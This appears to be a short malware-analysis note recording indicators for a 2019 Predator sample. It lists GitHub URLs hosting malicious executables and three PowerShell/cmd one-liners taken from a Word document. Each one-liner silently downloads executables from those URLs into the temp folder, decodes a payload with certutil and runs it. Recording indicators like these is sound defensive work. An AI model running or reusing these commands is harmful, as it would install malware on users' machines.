# 2019-11-21-predator

URLs
=====
https://raw.githubusercontent.com/jocofid282/tewsa/master/blow.exe
https://raw.githubusercontent.com/jocofid282/tewsa/master/dera
https://raw.githubusercontent.com/jocofid282/tewsa/master/JvlpB.exe

PoSH code from word doc (from the sample that I have, the code is all the same even though there are different hashes)
======================================================================================================================
cmd /c powershell -windowstyle hidden -command Import-Module BitsTransfer; Start-BitsTransfer -Source https://raw.githubusercontent.com/jocofid282/tewsa/master/blow.exe,https://raw.githubusercontent.com/jocofid282/tewsa/master/dera,https://raw.githubusercontent.com/jocofid282/tewsa/master/JvlpB.exe -Destination \"$env:TEMP\blow.exe\",\"$env:TEMP\dera\",\"$env:TEMP\JvlpB.exe\" &  certutil -decode %temp%\dera %temp%\dera.exe & powershell -windowstyle hidden -command Set-Location -Path \"$env:TEMP\"; Start-Process blow.exe -ArgumentList dera.exe

powershell -windowstyle hidden -command Import-Module BitsTransfer; Start-BitsTransfer -Source https://raw.githubusercontent.com/milliken1broderick/43fer/master/Masksim.exe -Destination \"$env:TEMP\cviak.exe\"; Start-Process -FilePath \"$env:TEMP\cviak.exe\"

cmd /c powershell -windowstyle hidden -command Import-Module BitsTransfer; Start-BitsTransfer -Source https://raw.githubusercontent.com/milliken1broderick/43fer/master/blow.exe,https://raw.githubusercontent.com/milliken1broderick/43fer/master/dera,https://raw.githubusercontent.com/milliken1broderick/43fer/master/JvlpB.exe -Destination \"$env:TEMP\blow.exe\",\"$env:TEMP\dera\",\"$env:TEMP\JvlpB.exe\" &  certutil -decode %temp%\dera %temp%\dera.exe & powershell -windowstyle hidden -command Set-Location -Path \"$env:TEMP\"; Start-Process blow.exe -ArgumentList dera.exe
